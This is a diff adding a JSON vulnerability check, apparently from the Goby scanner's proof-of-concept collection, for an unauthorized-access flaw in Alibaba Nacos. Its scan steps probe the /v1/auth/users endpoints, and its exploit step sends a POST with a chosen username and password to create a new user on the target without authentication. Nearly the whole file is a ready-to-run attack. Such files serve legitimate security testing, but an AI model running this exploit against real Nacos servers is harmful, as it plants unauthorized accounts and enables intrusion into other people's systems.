@@ -1,0 +1,125 @@
+{
+      "Name": "Alibaba Nacos Add user not authorized",
+      "Level": "2",
+      "Tags": [
+            "unauthorized"
+      ],
+      "GobyQuery": "title=\"Nacos\"",
+      "Description": "Alibaba Nacos is an easy-to-use platform designed for dynamic service discovery and configuration and service management. It helps you to build cloud native applications and microservices platform easily.",
+      "Product": "Alibaba Nacos",
+      "Homepage": "https://github.com/alibaba/nacos",
+      "Author": "",
+      "Impact": "On December 29, 2020, the Nacos official disclosed in the issue released by GitHub that there is an unauthorized access vulnerability in Alibaba Nacos due to improper handling of user agent. Through this vulnerability, the attacker can perform arbitrary operations, including creating a new user and performing post login operations.",
+      "Recommendation": "update",
+      "References": [],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "User",
+                  "Type": "input",
+                  "Value": "test"
+            },
+            {
+                  "Name": "Pass",
+                  "Type": "input",
+                  "Value": "test"
+            },
+            {
+                  "Name": "Dir",
+                  "Type": "select",
+                  "Value": "/v1/auth/users,/nacos/v1/auth/users"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "OR",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/nacos/v1/auth/users?",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            },
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/v1/auth/users?",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "500",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "{{{Dir}}}",
+                        "follow_redirect": true,
+                        "header": {
+                              "Content-Type": "application/x-www-form-urlencoded"
+                        },
+                        "data_type": "text",
+                        "data": "username={{{User}}}&password={{{Pass}}}"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|undefined|undefined"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
